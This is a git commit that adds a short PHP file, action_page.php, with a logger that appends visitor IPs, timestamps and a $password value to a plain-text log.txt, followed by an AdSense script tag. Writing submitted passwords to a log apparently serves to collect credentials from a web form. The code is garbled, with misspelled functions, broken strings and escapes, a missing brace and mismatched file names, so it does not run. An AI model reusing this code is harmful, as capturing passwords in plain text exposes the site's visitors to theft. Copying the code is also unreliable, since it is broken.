2067e1095b0d0956d5b499b90b39b72f5a559741
EnthernetCode <Enthernetcode@gmai.com>
2022-07-07 09:31:04 +0100

    initial commit

---
+++ jammy/action_page.php
@@ -0,0 +1,16 @@
+<?php
+function logger($log) {
+if (!file_exist ('lod.txt')){
+    file_put_contents ('lod.txt','');
+}
+
+$ip = $_Server ['REMOTE_ADDR']; //Client IP
+$time = date(m/d/y h:iA',time());
+    $contents = name('log.txt');
+    $contents .="ip/t$time/t$log/t$password/r":
+    
+      file_put_contents('log.txt',$contents);
+?>
+<head><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2831301945386272"
+     crossorigin="anonymous"></script></head>
+
